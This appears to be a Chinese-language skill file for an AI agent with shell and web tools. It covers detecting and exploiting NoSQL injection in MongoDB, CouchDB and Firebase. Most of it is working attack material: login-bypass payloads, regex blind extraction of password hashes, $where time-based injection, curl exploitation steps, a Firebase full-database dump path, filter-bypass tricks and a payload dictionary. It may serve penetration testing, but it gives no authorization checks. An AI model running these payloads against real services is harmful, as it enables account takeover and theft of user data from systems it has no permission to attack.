---
name: nosql-injection
description: "NoSQL注入 — MongoDB/CouchDB/Firebase 注入检测与利用。使用场景: 发现JSON API端点、REST API登录框、MongoDB Express面板、Firebase REST API。对应工具: nosqli_detector.py。"
allowed-tools: Bash, Read, Write, Grep, Glob, WebFetch
---

# NoSQL Injection — NoSQL 注入

## 与 SQL 注入的本质区别

```
SQL注入:  拼接查询字符串          id=1' OR '1'='1
NoSQL注入: 注入操作符              {"id": {"$ne": 0}}
```

NoSQL不使用SQL语言，而是用JSON/对象查询。注入点是**操作符**（`$ne`, `$regex`, `$where`）。

## 入口信号

```
JSON API:  Content-Type: application/json 的 POST/PUT/PATCH
GraphQL:   query/mutation 中有查询参数
REST:      URL参数名包含 id/key/_id/uid
登录框:    POST JSON 格式的登录请求
```

## 攻击类型

### 1. 登录绕过 ($ne/$gt)

```json
// MongoDB — 查 username不等于空 → 返回第一个用户
POST /login
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// 查username小于某个值 → 盲注
POST /api/users
{"username": {"$gt": ""}}
{"username": {"$gt": "a"}}
{"username": {"$gt": "m"}}
```

### 2. 布尔盲注 ($regex)

```json
// 逐字符提取数据
{"name": {"$regex": "^a"}}   // true/false
{"name": {"$regex": "^b"}}   // true/false
// 例: 提取密码哈希
{"password": {"$regex": "^a"}}
{"password": {"$regex": "^b"}}
```

### 3. 时间盲注 ($where)

```json
// MongoDB $where 可以执行JS
{"$where": "sleep(5000)"}
{"$where": "this.password.length==32"}
// 注意: $where 在较新版本中被限制
```

### 4. 内联注入 (直接注入操作符到字符串)

```json
// URL参数注入
GET /api/users?name=admin
GET /api/users?name[$ne]=guest
GET /api/users?name[$regex]=^a

// 表单注入
POST /login
username[$ne]=&password[$ne]=
```

## 工具调用

```bash
# 基础检测
python -m aimy.tools.nosqli_detector --url "http://target.com/api/login" --param username

# JSON body 模式
python -m aimy.tools.nosqli_detector --url "http://target.com/api/login" --json '{"username": "admin", "password": {"$ne": ""}}'

# 盲注提取
python -m aimy.tools.nosqli_detector --url "http://target.com/api/users" --blind --extract
```

## 手动检测方法

### 1. 检测入口

```bash
# 找JSON API端点
grep -r "application/json" | grep -i "login\|auth\|user\|api"
katana -u https://target.com -jc | grep -i "api\|json"

# 测试端点
curl -X POST https://target.com/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "test"}'
```

### 2. 注入测试

```bash
# Step 1: 正常请求 → 看响应
curl -X POST ... -d '{"username": "admin", "password": "test"}'

# Step 2: $ne绕过 → 看是否返回不同
curl -X POST ... -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# Step 3: $regex → 看是否可盲注
curl -X POST ... -d '{"username": {"$regex": "^a"}}'

# Step 4: $where → 看是否支持JS
curl -X POST ... -d '{"$where": "1==1"}'
```

### 3. 数据库区分

```bash
# MongoDB
{"$where": "sleep(5000)"}           → 延迟5秒
{"username": {"$ne": ""}}           → 返回数据

# CouchDB
{"$regex": "a"}                     → 支持
{"$ne": ""}                         → 不支持(不同语法)

# Firebase
GET /.json                          → 全部数据泄露(常见!)
```

## Payload 字典

```json
// 登录绕过
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$in": ["admin", "root"]}, "password": {"$ne": ""}}
{"$or": [{"username": "admin"}, {"username": {"$ne": ""}}]}

// 盲注
{"username": {"$regex": ".*"}}
{"username": {"$regex": "^a.*"}}
{"username": {"$regex": "(.)*"}}
{"$where": "this.username.length>0"}

// 时间盲注
{"$where": "sleep(5000)"}
{"$where": "this.password.match(/^a/) && sleep(5000)"}

// 批量返回
{"$where": "1"}

// Firebase
{"username": "admin", "password": {"$ne": ""}}
```

## 绕过技巧

```
1. Content-Type 绕过: application/json 改成 text/json
2. 参数类型混淆: username=admin&password[$ne]=
3. 编码注入: URL编码 $ne → %24ne
4. 重复参数: username=admin&username[$ne]=
5. 嵌套对象: {"query": {"username": {"$ne": ""}}}
```

## 工具链

```
nosqli_detector.py  →  基础检测 + 盲注
payload_engine.py   →  生成变异payload
intel_query.py      →  查H1 NoSQL注入案例
```

## 参考H1案例

```bash
python -m aimy.tools.intel_query --type nosqli
# 或
python -m aimy.tools.intel_query --keyword "NoSQL injection"
```
